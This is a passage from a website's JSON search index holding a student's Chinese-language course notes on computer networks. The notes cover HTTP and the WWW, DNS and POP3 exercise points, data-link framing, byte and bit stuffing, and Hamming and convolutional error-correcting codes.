<ul> <li>B\u4e0d\u52a0\u5bc6\u4f7f\u7528\u660e\u6587</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#5","title":"5. \u4e07\u7ef4\u7f51*","text":"<p>\u4e07\u7ef4\u7f51WWW\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5206\u5e03\u5f0f\uff0c\u8054\u673a\u5f0f\u7684\u4fe1\u606f\u5b58\u50a8\u7a7a\u95f4\uff0c\u4e00\u6837\u6709\u7528\u7684\u4e8b\u7269\u79f0\u4e3a\u8d44\u6e90\uff0c\u5e76\u7528URL\u6807\u8bc6\uff0c\u8fd9\u4e9b\u8d44\u6e90\u901a\u8fc7HTTP\u534f\u8bae\u7ed9\u4f7f\u7528\u8005</p> <p>\u4e07\u7ef4\u7f51\u6709\u4e09\u4e2a\u6807\u51c6\u7ec4\u6210</p> <p>\u200b\u200b</p> <p>URL\u7684\u57fa\u672c\u5f62\u5f0f\u662f</p> <ul> <li>\u534f\u8bae\uff1a//\u4e3b\u673a\uff1a\u7aef\u53e3/\u8def\u5f84</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#51-http","title":"5.1 HTTP","text":"<p>http\u662f transaction-oriented \u7684\u534f\u8bae\uff0cHTTP\u662f\u57fa\u4e8eTCP\uff0c\u7136\u540e\u4f7f\u752880\u7aef\u53e3</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>HTTP\u672c\u8eab\u662f\u65e0\u8fde\u63a5\u7684\uff0c\u6ca1\u6709HTTP\u8fde\u63a5\u8fd9\u4e2a\u8bf4\u6cd5</p> <p>HTTP\u662f\u65e0\u72b6\u6001\u7684\uff0c\u7528\u6237\u7684\u6bcf\u4e00\u6b21\u8bbf\u95ee\u4e0d\u4f1a\u5f71\u54cd\u4e0b\u4e00\u6b21\u8bbf\u95ee\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u4f1a\u7528cookie\u6765\u4fdd\u5b58\u72b6\u6001</p> <p>HTTP\u53ef\u4ee5\u91c7\u7528\u975e\u6301\u7eed\u7684HTTP/1.0\u548c\u6301\u7eed\u7684HTTP/1.1</p> <ul> <li>\u975e\u6301\u7eed\u8fde\u63a5 \u6bcf\u4e2a\u7f51\u9875\u5bf9\u8c61\u90fd\u8981\u5355\u72ec\u5efa\u7acb\u4e00\u4e2aTCP\u8fde\u63a5</li> <li> <p>\u6301\u7eed\u8fde\u63a5\uff0c\u53ef\u4ee5\u5728\u4e00\u5f00\u59cb\u5efa\u7acb\u7684TCP\u4e0a\u4f20\u8f93HTTP\u8bf7\u6c42\u548c\u54cd\u5e94\u62a5\u6587</p> </li> <li> <p>\u53c8\u6709\u6d41\u6c34\u7ebf\u548c\u975e\u6d41\u6c34\u7ebf\u4e24\u79cd</p> </li> </ul> <p>HTTP\u62a5\u6587</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/#_5","title":"\u4e60\u9898","text":"<p>\u200b\u200b</p> <ul> <li>\u5148\u67e5\u770b\u672c\u5730\u7684DNS\u670d\u52a1\u5668</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>DNS \u7684 RR</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>POP3\u7684\u7aef\u53e3\u662f110</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u524d\u7aef\u9886\u57df\u5927\u5e08</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u670d\u52a1\u5668\u7684\u590d\u7528\u6280\u672f tunneling \u96a7\u9053\u6280\u672f\uff08Ipv4\u8f6c\u6362\u6210Ipv6\uff09 content delivery networks \u5206\u5e03\u5f0f\u6280\u672f</li> </ul> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"\u6570\u636e\u94fe\u8def\u5c42","text":"<ul> <li>\u68c0\u9519\u548c\u7ea0\u9519</li> </ul> <p>\u53d1\u9001\u65b9\u7684\u7f51\u7edc\u5c42\u5c06\u6570\u636e\u5305\u4ea4\u7ed9\u6570\u636e\u94fe\u8def\u5c42\uff0c\u6570\u636e\u94fe\u8def\u5c42\u901a\u8fc7\u7269\u7406\u5c42\u7684\u670d\u52a1\u5c06\u6570\u636e\u4f20\u8f93\u7ed9\u63a5\u6536\u65b9\u7684\u6570\u636e\u94fe\u8def\u5c42\uff0c\u63a5\u6536\u65b9\u7684\u6570\u636e\u94fe\u8def\u5c42\u518d\u628a\u6536\u5230\u7684\u6570\u636e\u7ed9\u7f51\u7edc\u5c42\u3002</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#0","title":"0. \u95ee\u9898\u4e0e\u76ee\u6807","text":"<p>\u9700\u8981\u5904\u7406\u7684\u95ee\u9898</p> <ul> <li>\u7269\u7406\u5c42\u4f20\u8f93\u7684\u662f\u6bd4\u7279\u6d41\uff0c\u94fe\u8def\u5c42\u4f1a\u5c06\u6570\u636e\u5305\u505a\u754c\u9650\u533a\u5206</li> <li>\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u53d1\u751f\u7684\u9519\u8bef</li> <li>\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u5904\u7406\u6570\u636e\u901f\u7387\u7684\u4e0d\u540c</li> </ul> <p>\u663e\u7136\u4e0d\u8bba\u89e3\u51b3\u54ea\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u90fd\u9700\u8981\u589e\u52a0\u4e00\u4e9b\u6570\u636e\uff0c\u56e0\u6b64\u6570\u636e\u94fe\u8def\u5c42\u5c06\u7f51\u7edc\u5c42\u63d0\u4f9b\u7684\u6570\u636e\u5305\uff0c\u589e\u52a0Header\u548cTailer\uff0c\u53d8\u6210\u4e00\u4e2a\u5e27 frame</p> <p>\u200b\u200b</p> <p>\u63a5\u6536\u65b9\u62ff\u5230\u4e4b\u540e\u518d\u628aPacket\u4ecePayload field\u53d6\u51fa\u6765</p> <p>\u4e3b\u8981\u7684\u4efb\u52a1\uff08\u94fe\u8def\u5c42\u63d0\u4f9b\u70b9\u5230\u70b9\u548c\u5e7f\u64ad\u670d\u52a1\uff09</p> <p>\u8981\u548c\u7aef\u5230\u7aef\u533a\u5206\u5f00\u6765</p> <ul> <li> <p>\u5c01\u88c5\u6210\u5e27</p> </li> <li> <p>\u63a5\u53d7\u65b9\u8981\u4ece\u8fde\u7eed\u7684bit\u6d41\u4e2d\u80fd\u628a\u4e00\u4e2a\u4e2a\u5e27\u533a\u5206\u5f00\u6765 \u5e27\u5b9a\u754c / \u5e27\u540c\u6b65</p> </li> <li> <p>\u900f\u660e\u4f20\u8f93</p> </li> <li> <p>\u94fe\u8def\u5c42\u6216\u8bb8\u4f1a\u91c7\u7528\u4e00\u4e9b\u65b9\u6cd5\u6765\u5b9e\u73b0\u5176\u9700\u8981\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u4e3a\u4e86\u5b9e\u73b0\u5e27\u5b9a\u754c\uff0c\u5176\u53ef\u80fd\u4f1a\u8981\u6c42\u4e00\u5e27\u91cc\u9762\u4e0d\u51fa\u73b0\u8fde\u7eed\u76845\u4e2a1\uff0c\u4f46\u662f\u8fd9\u4e2a\u64cd\u4f5c\u5e94\u8be5\u7531\u94fe\u8def\u5c42\u81ea\u5df1\u5b9e\u73b0\uff0c\u5bf9\u4e8e\u94fe\u8def\u5c42\u7684\u4f7f\u7528\u8005\u6765\u8bf4\u4e0d\u5e94\u8be5\u5b58\u5728\u8fd9\u79cd\u9650\u5236\uff08\u4efb\u4f55\u673a\u5236\u4e0d\u5f97\u5f71\u54cd\u5230\u4f7f\u7528\u8005\uff09</p> </li> <li> <p>\u6d41\u91cf\u63a7\u5236</p> </li> <li> <p>OSI\u7684\u94fe\u8def\u5c42\u5b58\u5728\u8fd9\u4e2a\u529f\u80fd\uff0c\u5728TCP/IP\u4e2d\uff0c\u8fd9\u4e2a\u529f\u80fd\u79fb\u4ea4\u7ed9\u4f20\u8f93\u5c42\uff0c\u5176\u4e3b\u8981\u5728\u4e8e\u63a7\u5236\u53d1\u9001\u65b9\u7684\u53d1\u9001\u6548\u7387\uff0c\u4f7f\u5176\u4e0d\u81f3\u4e8e\u6df9\u6ca1\u63a5\u6536\u65b9\u7684\u63a5\u53d7\u80fd\u529b</p> </li> <li> <p>\u5dee\u9519\u68c0\u6d4b</p> </li> <li> <p>\u5305\u62ec\u4e24\u4e2a\u90e8\u5206\uff0c\u4e00\u4e2a\u9519\u8bef\u68c0\u6d4b\u529f\u80fd\uff08\u9488\u5bf9\u9519\u8bef\uff0c\u4f7f\u7528CRC\uff09\uff1b\u53e6\u4e00\u4e2a\u4e22\u5931\uff0c\u5904\u7406\u65b9\u6cd5\u662f\u786e\u8ba4\u91cd\u4f20</p> </li> </ul> <p>\u63d0\u4f9b\u7ed9\u7f51\u7edc\u5c42\u7684\u670d\u52a1</p> <p>\u6570\u636e\u94fe\u8def\u5c42\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8bbe\u8ba1\u4e0d\u540c\u7684\u534f\u8bae\uff0c\u4e0d\u540c\u7684\u534f\u8bae\u53ef\u80fd\u56ca\u62ec\u4e86\u4e0d\u540c\u7684\u670d\u52a1\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u9700\u9009\u62e9\u76f8\u5e94\u7684\u534f\u8bae\u3002</p> <p>\u5e38\u89c1\u7684\u670d\u52a1\u5305\u62ec</p> <ul> <li> <p>\u65e0\u786e\u8ba4\u7684\u65e0\u8fde\u63a5\u670d\u52a1 Unacknowledge Connectless Service</p> </li> <li> <p>\u786e\u8ba4\u662f\u6307\u9632\u6b62\u4e22\u5e27\u7684\u529f\u80fd</p> </li> <li>\u8be5\u670d\u52a1\u4e0d\u5bf9\u4e22\u5e27\u8fdb\u884c\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u6062\u590d\uff0c\u9002\u7528\u4e8e\u9519\u8bef\u7387\u5f88\u4f4e\u7684\u60c5\u51b5\uff0c\u6bd4\u5982\u5149\u7ea4\u4f20\u8f93\uff1b\u6216\u8005\u5373\u65f6\u901a\u4fe1\uff0c\u76f4\u64ad\u7b49\u5bf9\u5b9e\u65f6\u6027\u8981\u6c42\u5f88\u9ad8\u7684\u60c5\u5f62\uff0c\u5e76\u4e14\u5076\u5c14\u4e22\u5931\u5173\u7cfb\u4e0d\u5927</li> <li> <p>\u6709\u786e\u8ba4\u7684\u65e0\u8fde\u63a5\u670d\u52a1 Acknowledge Connectless Service</p> </li> <li> <p>\u6bcf\u4e00\u5e27\u90fd\u9700\u8981\u5355\u72ec\u786e\u8ba4\uff0c\u5982\u679c\u53d1\u9001\u65b9\u53d1\u9001\u4e00\u4e2a\u5e27\u4e4b\u540e\u518d\u5236\u5b9a\u65f6\u95f4\u5185\u672a\u786e\u8ba4\uff0c\u5219\u9700\u8981\u91cd\u65b0\u53d1\u9001\uff0c\u9002\u7528\u4e8e\u4e0d\u53ef\u9760\u4fe1\u9053\uff0c\u4f8b\u5982\u65e0\u7ebf\u7cfb\u7edf 802.11 WiFi</p> </li> <li> <p>\u6709\u786e\u8ba4\u7684\u9762\u5411\u8fde\u63a5\u670d\u52a1 Acknowledge Connect-Oriented Service\uff08\u8981\u6c42\u7684\u53ef\u9760\u6027\u6700\u9ad8\uff09</p> </li> <li> <p>\u5728\u4f20\u8f93\u6570\u636e\u4e4b\u524d\u5148\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u4fdd\u8bc1\u6bcf\u4e2a\u5e27\u90fd\u6709\u5e8f\uff0c\u4e0d\u91cd\u590d\u5730\u88ab\u63a5\u6536\u65b9\u63a5\u6536\uff0c\u4f20\u8f93\u7ed3\u675f\u540e\u8fde\u63a5\u548c\u7ef4\u62a4\u8fde\u63a5\u7684\u8d44\u6e90\u88ab\u91ca\u653e</p> </li> <li>\u4e3a\u4e86\u4fdd\u8bc1\u6b63\u786e\u6027\uff0c\u53cc\u65b9\u9700\u8981\u7ef4\u62a4\u4e00\u4e9b\u53d8\u91cf\u548c\u8ba1\u6570\u5668\uff0c\u8bb0\u5f55\u54ea\u4e9b\u5e27\u5df2\u7ecf\u6536\u5230\u4e86\uff0c\u54ea\u4e9b\u8fd8\u6ca1\u88ab\u6536\u5230\u3002</li> <li>\u9002\u7528\u4e8e\u957f\u8ddd\u79bb\u4e0d\u53ef\u9760\u94fe\u8def\uff0c\u4f8b\u5982\u536b\u661f\u4fe1\u9053\u548c\u957f\u9014\u7535\u8bdd</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#1","title":"1. \u5305\u88c5\u6210\u5e27","text":"<p>\u6210\u5e27\uff08Framing\uff09\u7684\u6838\u5fc3\u4efb\u52a1\u662f\u8bbe\u8ba1\u4e00\u79cd\u65b9\u6848\uff0c\u4f7f\u5f97\u63a5\u6536\u65b9\u5f88\u5bb9\u6613\u627e\u5230\u6bcf\u4e2a\u5e27\u7684\u5f00\u59cb\uff08\u56e0\u4e3a\u5e27\u4f1a\u88ab\u62c6\u6210\u6bd4\u7279\u6d41\u53d1\u9001\uff09\uff0c\u4ece\u800c\u80fd\u5c06\u6bd4\u7279\u6d41\u8fd8\u539f\u6210\u4e00\u4e2a\u4e2a\u5e27\uff1b\u540c\u65f6\u4e0d\u80fd\u5360\u7528\u592a\u591a\u5e26\u5bbd</p> <p>\u5b57\u8282\u8ba1\u6570\u6cd5 byte count</p> <p>\u200b\u200b</p> <p>\u6bcf\u4e00\u5e27\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8fd9\u4e00\u5e27\u6709\u591a\u5c11\u4e2a\u5b57\u8282\uff08\u5305\u62ec\u8fd9\u4e2a\u5b57\u8282\uff09</p> <p>\u5176\u7f3a\u9677\u5728\u4e8e\uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u5b57\u8282\u8fd9\u4e2a\u8ba1\u6570\u503c\u53d1\u751f\u9519\u8bef\uff0c\u5373\u4fbf\u63a5\u6536\u65b9\u901a\u8fc7\u9519\u8bef\u6821\u9a8c\u53d1\u73b0\u4e86\u9519\u8bef\uff0c\u4e5f\u65e0\u6cd5\u77e5\u9053\u4e0b\u4e00\u5e27\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002\u4e5f\u5c31\u5bfc\u81f4\u4e86\u5931\u53bb\u540c\u6b65\uff08get out of sync\uff09</p> <p>\u6807\u5fd7\u5b57\u8282\u6cd5 Flag bytes</p> <p>\u200b\u200b</p> <p>\u5c31\u50cf\u6211\u4eec\u5728\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5c31\u628a\u5b83\u7528\u53cc\u5f15\u53f7\u6807\u8bb0\u8d77\u6765\uff0c\u8fd9\u91cc\u6211\u4eec\u628a\u8981\u53d1\u9001\u7684byte\u7528Flag\u6807\u8bb0\u8d77\u6765</p> <p>\u5982\u679c\u6211\u4eec\u8981\u5728Frame\u91cc\u9762\u5199\u5165Flag\uff0c\u5219\u5728\u524d\u9762\u52a0\u4e00\u4e2aEsc\u4f5c\u4e3a\u8f6c\u4e49\uff1b\u5982\u679c\u8981\u5199\u5165Esc\uff0c\u5c31\u5728Esc\u524d\u9762\u5199\u4e00\u4e2aEsc\u4f5c\u4e3a\u8f6c\u4e49\u3002\u8fd9\u79cd\u6280\u672f\u88ab\u79f0\u4e3a\u5b57\u8282\u586b\u5145 byte stuffing</p> <p>\u5982\u679c\u5185\u5bb9\u91cc\u9762\u5927\u91cf\u51fa\u73b0Esc\u548cFlag\u7684\u8bdd\uff0c\u4f1a\u5bfc\u81f4overload\u8f83\u9ad8</p> <p>\u6807\u5fd7\u6bd4\u7279\u6cd5 Flag bits</p> <p>\u200b\u200b</p> <p>\u8fd9\u4e2a\u505a\u6cd5\u9700\u8981\u6211\u4eec\u4ee5bit\u800c\u4e0d\u662fbyte\u53d1\u9001\u4fe1\u606f\uff0c\u6211\u4eec\u5bf9\u53d1\u9001\u7684bit\u6d41\u8fdb\u884c\u5904\u7406\uff0c\u5982\u679c\u5176\u4e2d\u6709\u8fde\u7eed\u76845\u4e2a1\uff0c\u5c31\u5728\u540e\u9762\u63d2\u5165\u4e00\u4e2a0\u3002\u8fd9\u4e2a\u6280\u672f\u79f0\u4e3a\u6bd4\u7279\u586b\u5145 bit stuffing</p> <p>\u7136\u540e\u6211\u4eec\u6bcf\u4e2a\u5e27\u7684\u5f00\u5934\u548c\u7ed3\u5c3e\u7528\u5e8f\u5217 01111110 (0x7E) \u6807\u5fd7</p> <p>\u76f8\u5bf9\u6765\u8bf4 overload \u4f1a\u6bd4\u8f83\u4f4e</p> <p>\u5f88\u5bb9\u6613\u4ee5\u786c\u4ef6\u5b9e\u73b0HDLC\u534f\u8bae\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u505a\u6cd5</p> <p>\u7269\u7406\u5c42\u7f16\u7801\u8fdd\u7981\u6cd5 Physical layer coding violations</p> <p>\u5f53\u6211\u4eec\u5728\u7269\u7406\u5c42\u4f7f\u7528 4B/5B \u6216\u8005 Manchester \u7f16\u7801\u65b9\u6cd5\u65f6\uff0c\u6709\u4e00\u90e8\u5206\u4fe1\u53f7\u7ec4\u5408\u662f\u4e0d\u4f1a\u51fa\u73b0\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u8fd9\u4e9b\u4e0d\u4f1a\u51fa\u73b0\u7684\u4fe1\u53f7\u7ec4\u5408\u4f5c\u4e3a\u5e27\u7684\u5f00\u59cb\u548c\u8282\u6570</p> <p>\u8fd9\u79cd\u505a\u6cd5\u7684\u597d\u5904\u662f\u6211\u4e0d\u9700\u8981\u586b\u5145\u6570\u636e\uff0coverload\u5c0f\uff0cIEEE 802 \u91c7\u7528\u4e86\u8fd9\u4e2a\u65b9\u6cd5</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#2","title":"2. \u68c0\u9519\u548c\u7ea0\u9519","text":"<ul> <li>\u5982\u679c\u6211\u4eec\u9700\u8981\u6392\u9664\u4e22\u5931\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u786e\u8ba4</li> <li>\u5982\u679c\u6211\u4eec\u9700\u8981\u6392\u9664\u9519\u8bef\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9\u9519\u8bef\u8fdb\u884c\u6062\u590d\uff1b\u4e5f\u53ef\u4ee5\u68c0\u67e5\u9519\u8bef\uff0c\u7136\u540e\u91cd\u4f20</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#21","title":"2.1 \u4e00\u4e9b\u5b9a\u4e49","text":"<p>\u7801\u5b57 codeword</p> <p>\u6211\u4eec\u68c0\u67e5\u9519\u8bef\u663e\u7136\u9700\u8981\u989d\u5916\u4fe1\u606f\uff0c\u5047\u8bbe\u6211\u4eec\u6709 m \u4e2a\u6570\u636e\u4e3a\u5b58\u50a8\u4fe1\u606f\uff0c\u6709 r \u4e2a\u5197\u4f59\u4f4d\uff08redundant / check bit\uff09\u6765\u6821\u9a8c\uff0c\u90a3\u4e48\u8fd9\u4e2a n = m + r \u7684\u6570\u636e\u5757\u79f0\u4e3a n \u4e3a \u7801\u5b57</p> <p>\u7801\u7387 code rate</p> <p>\u8868\u793a\u7801\u5b57\u4e2d\u4fe1\u606f\u4f4d\u6240\u5360\u7684\u6bd4\u4f8b\uff0c\u4e5f\u5c31\u662f m / n</p> <p>\u4e00\u822c\u8d8a\u9ad8\u8d28\u91cf\u7684\u4fe1\u9053code rate\u8d8a\u9ad8\uff0c\u566a\u58f0\u8d8a\u591a\u7684\u4fe1\u9053code rate\u8d8a\u4f4e</p> <p>Hamming distance</p> <p>\u4e24\u4e2a\u7b49\u957f\u7684\u7801\u5b57\u4e4b\u95f4\u4e0d\u76f8\u540c\u7684\u4f4d\u6570\u79f0\u4e3a\u8fd9\u4e24\u4e2a\u7801\u5b57\u7684\u6d77\u660e\u8ddd\u79bb</p> <ul> <li>\u5982\u679c\u6211\u4eec\u9700\u8981\u53ef\u9760\u7684\u68c0\u6d4b e \u4e2a\u9519\u8bef\uff0c\u6211\u4eec\u9700\u8981\u6d77\u660e\u8ddd\u79bb\u4e3a e + 1 \u7684\u7f16\u7801\u65b9\u6848\u3002\u56e0\u4e3a\u53d1\u751fe\u4ee5\u4e0b\u7684\u9519\u8bef\u4e0d\u53ef\u80fd\u628a\u4e00\u4e2a\u5408\u6cd5\u7801\u5b57\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u5408\u6cd5\u7801\u5b57</li> <li>\u5982\u679c\u6211\u4eec\u9700\u8981\u53ef\u9760\u7684\u7ea0\u6b63 e \u4e2a\u9519\u8bef\uff0c\u6211\u4eec\u9700\u8981\u6d77\u660e\u8ddd\u79bb\u4e3a 2e + 1 \u7684\u7f16\u7801\u65b9\u6848\uff0c\u56e0\u4e3a\u53d1\u751f\u4e86e\u4ee5\u4e0b\u7684\u9519\u8bef\uff0c\u4f60\u4ecd\u7136\u662f\u79bb\u6b63\u786e\u7801\u5b57\u6700\u8fd1\u7684\u90a3\u4e00\u4e2a</li> </ul> <p>\u4e0a\u8ff0\u4e24\u4e2a\u5176\u5b9e\u4e0d\u4f1a\u540c\u65f6\u6210\u7acb\uff0c\u6211\u4eec\u7684e\u662f\u552f\u4e00\u786e\u5b9a\u7684\uff0c\u56e0\u4e3a\u5982\u679ce\u4e0d\u786e\u5b9a\uff0c\u4f1a\u53d1\u751f\u9519\u8bef\u7684\u7ea0\u6b63</p> <p>\u7f16\u7801\u65b9\u5f0f\u7684\u5b9a\u4e49</p> <p>\u53ea\u9700\u8981\u77e5\u9053\u5b9e\u9645\u505a\u6cd5\u5c5e\u4e8e\u54ea\u4e00\u7c7b\u5373\u53ef</p> <ul> <li>block rate \u51fd\u6570\u8ba1\u7b97</li> <li>systematic rate</li> <li>line rate</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#22","title":"2.2 \u7ea0\u9519\u7801","text":"<p>\u7ea0\u9519\u7801\u5e38\u7528\u4e8e</p> <ul> <li>\u65e0\u7ebf\u94fe\u8def\uff0c\u65e0\u7ebf\u94fe\u8def\u5bb9\u6613\u51fa\u9519</li> <li>\u5355\u5de5\u4fe1\u9053\uff0c\u63a5\u53d7\u6cd5\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u4e5f\u65e0\u6cd5\u53d1\u51fa\u4e00\u4e2a\u91cd\u4f20\u8bf7\u6c42</li> </ul> <p>\u6d77\u660e\u7801 Hamming code</p> <p>\u6bd4\u8f83\u91cd\u8981\uff0c\u9700\u8981\u4f1a\u7b97</p> <p>\u9996\u5148\u6211\u4eec\u6709\u4e00\u4e2a\u5b9a\u7406\u4e00\u6837\u7684\u5b58\u5728\uff0c\u53ef\u4ee5\u53d6\u5f97\u4e00\u4e2ar\u7684\u4e0b\u754c</p> <p>\u5047\u8bbe\u6211\u4eec\u9700\u8981\u7ea0\u6b63\u6240\u6709\u7684 1 bit \u9519\u8bef\uff0c\u90a3\u4e48\u6211\u4eec\u6709m\u4e2a\u4fe1\u606f\u4f4d\u548cr\u4e2a\u5197\u4f59\u4f4d\uff0c\u90a3\u4e48\u6709 \\(2^m\\) \u4e2a\u5408\u6cd5\u4fe1\u606f\uff0c\u6bcf\u4e2a\u4fe1\u606f\u90fd\u6709 n \u4e2a\u975e\u6cd5\u7801\u5b57\uff0c\u518d\u52a0\u4e0a\u5b83\u81ea\u8eab\uff0c\u6709 \\((n+1)*2^m\\) \u79cd\u60c5\u51b5\uff0c\u4e8e\u662f\u6211\u4eec\u6709</p> \\[ (n+1)*2^m \\leq2^n \\] <p>\u63a8\u5bfc\u5f97\u51fa</p> \\[ (m+r+1)\\leq2^r \\] <p>Hamming code \u662f\u4e00\u79cd\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u8fd9\u4e2a\u4e0b\u754c\u7684\u65b9\u6cd5\uff0c\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0Hamming code\u88ab\u79f0\u4e3a \u5076\u6821\u9a8chamming code\uff0c\u800c\u5947\u6821\u9a8chamming code\u53ea\u9700\u8981\u628a\u7b2c\u4e09\u6b65\u5f97\u5230\u76841101\u6309\u4f4d\u53d6\u53cd\u5c31\u884c\uff0c\u5f97\u52300010</p> <p>**\u5377\u79ef\u7801 convolutional codes ***</p> <p>\u4f3c\u4e4e\u548c\u7269\u8054\u7f51\u90a3\u8fb9\u662f\u4e00\u6837\u7684\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u6765\u81ea\u7269\u8054\u7f51</p> <p>\u200b\u200b</p> <p>\u4e00\u5f00\u59cb\u4e24\u4e2a\u5bc4\u5b58\u5668\u90fd\u662f0 \u8f93\u5165\u4e00\u4e2abit \u8f93\u51fa\u4e24\u4e2abit</p> <p>\u8f93\u5165 0 \u5bc4\u5b58\u5668 0 0 \u4e0a\u4e0b\u662f\u4e24\u4e2a\u5f02\u6216\u64cd\u4f5c \u663e\u7136\u8f93\u51fa\u662f 00 \uff0c\u968f\u540e &lt;\u8f93\u5165 \u5bc4\u5b58\u56681 \u5bc4\u5b58\u56682&gt; \u5f80\u53f3\u79fb\u52a8\u4e00\u683c \u663e\u7136\u5bc4\u5b58\u5668\u8fd8\u662f00</p> <p>\u8f93\u5165 1 \u5bc4\u5b58\u5668 0 0 \u8f93\u51fa 1 1 \u5bc4\u5b58\u5668 1 0</p> <p>\u8f93\u5165 1 \u5bc4\u5b58\u5668 1 0 \u8f93\u51fa 0 1 \u5bc4\u5b58\u5668 1 1</p> <p>\u8f93\u5165 0 \u5bc4\u5b58\u5668 1 1 \u8f93\u51fa 0 1 \u5bc4\u5b58\u5668 0 1</p> <p>\u8fd9\u5c31\u662f\u7f16\u7801\u7684\u8fc7\u7a0b</p> <p>Trellis diagram</p> <p>\u200b\u200b</p> <p>\u9996\u5148\u5217\u51fa\u5bc4\u5b58\u5668\u6240\u6709\u7684\u72b6\u6001\uff0c\u7136\u540e\u753b\u516b\u6761\u7ebf \u4f5c\u4e3a\u8f93\u5165\u7684\u4e0d\u540c\u60c5\u5f62 \u5b9e\u7ebf\u662f\u8f93\u51650 \u865a\u7ebf\u662f\u8f93\u51651 \u5bc4\u5b58\u5668\u6570\u91cf\u7b49\u4e8e\u8bb0\u5fc6\u957f\u5ea6</p> <p>\u4e00\u5f00\u59cb\u5fc5\u5b9a\u662f00</p> <p>\u4e0b\u9762\u662f\u8ba1\u7f51\u7684\u90e8\u5206</p> <p>\u200b\u200b</p> <p>\u5185\u90e8\u5b58\u5728\u72b6\u6001\u673a\uff0c\u89e3\u7801\u8fd8\u662f\u627e\u5230\u6700\u76f8\u8fd1\u7684\u4e1c\u897f</p> <p>\u5176\u4ed6\u7f16\u7801\u673a\u5236</p> <p>\u91cc\u6240\u7f57\u95e8\u7801 Reed-Solomon codes</p> <p>\u4f4e\u5bc6\u5ea6\u5947\u5076\u6821\u9a8c\u7801 LDPC Low-Density Parity Check</p> <p>\u4e0a\u8ff0\u4e24\u79cd\u52a0\u4e0a\u524d\u9762\u4e24\u79cd\u91cc\u9762\uff0c\u53ea\u6709\u5377\u79ef\u7801\u662f\u7ebf\u6027\u7801\uff08\u56e0\u4e3a\u5176\u4e2d\u6709\u72b6\u6001\u673a\uff09\uff0c\u5176\u4ed6\u4e09\u79cd\u90fd\u662f\u7ebf\u6027\u5757\u7801</p> <p>\u4ec0\u4e48\u662f\u72b6\u6001\u673a\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u91cc\u9762\u6709static\u53d8\u91cf\uff0c\u4e5f\u5c31\u662f\u8bf4\u76f8\u540c\u7684\u8f93\u5165\u5728\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u8f93\u51fa</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#23","title":"2.3 \u68c0\u9519\u7801","text":"<p>\u68c0\u9519\u7801\u5e38\u7528\u4e8e</p> <ul> <li>\u5149\u7ea4\u548c\u9ad8\u54c1\u8d28\u94dc\u7ebf\uff0c\u9519\u8bef\u7387\u8f83\u4f4e\uff0c\u56e0\u6b64\u9519\u8bef\u68c0\u6d4b+\u91cd\u4f20\u673a\u5236\u5f88\u6709\u6548</li> </ul> <p>\u4e0b\u9762\u4ecb\u7ecd\u7684\u4e09\u79cd\u68c0\u9519\u7801\uff0c\u90fd\u662f\u7ebf\u6027\u7684\u7cfb\u7edf\u5757\u7801</p> <p>\u5947\u5076\u6821\u9a8c\u4f4d parity bit</p> <p>\u6709 n-1 